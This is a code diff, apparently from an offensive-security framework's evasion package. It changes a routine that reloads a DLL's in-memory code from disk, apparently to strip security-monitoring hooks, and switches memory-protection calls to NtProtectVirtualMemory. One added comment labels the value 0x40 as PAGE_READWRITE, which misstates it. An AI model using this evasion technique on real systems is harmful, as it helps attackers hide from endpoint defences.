@@ -50,8 +50,9 @@ func ReloadDLL(d string) error {
 		bugtrack.Track("evade.ReloadDLL(): Received call to reload DLL d=%s.", d)
 	}
 	var (
-		e      = fullPath(d)
-		f, err = os.Open(e)
+		e = fullPath(d)
+		// 0 - READONLY
+		f, err = os.OpenFile(e, 0, 0)
 	)
 	if err != nil {
 		return err
@@ -80,9 +81,10 @@ func ReloadDLL(d string) error {
 	}
 	var (
 		i = x + uintptr(s.VirtualAddress)
-		o uint32
 	)
-	if err = winapi.VirtualProtect(i, uint64(len(v)), 0x40, &o); err != nil {
+	// 0x4 - PAGE_READWRITE
+	o, err := winapi.NtProtectVirtualMemory(winapi.CurrentProcess, i, uint32(len(v)), 0x40)
+	if err != nil {
 		return err
 	}
 	if bugtrack.Enabled {
@@ -98,7 +100,7 @@ func ReloadDLL(d string) error {
 		//            fucking lol.
 		(*(*[1]byte)(unsafe.Pointer(i + uintptr(a))))[0] = v[a]
 	}
-	if err = winapi.VirtualProtect(i, uint64(len(v)), o, &o); bugtrack.Enabled {
+	if _, err = winapi.NtProtectVirtualMemory(winapi.CurrentProcess, i, uint32(len(v)), o); bugtrack.Enabled {
 		bugtrack.Track("evade.ReloadDLL(): DLL reload complete, d=%s, err=%s.", d, err)
 	}
 	return err
@@ -119,8 +121,9 @@ func isBaseName(n string) bool {
 // Always returns 'ErrNoWindows' on non-Windows devices.
 func CheckDLL(d string) (bool, error) {
 	var (
-		e      = fullPath(d)
-		f, err = os.Open(e)
+		e = fullPath(d)
+		// 0 - READONLY
+		f, err = os.OpenFile(e, 0, 0)
 	)
 	if err != nil {
 		return false, err
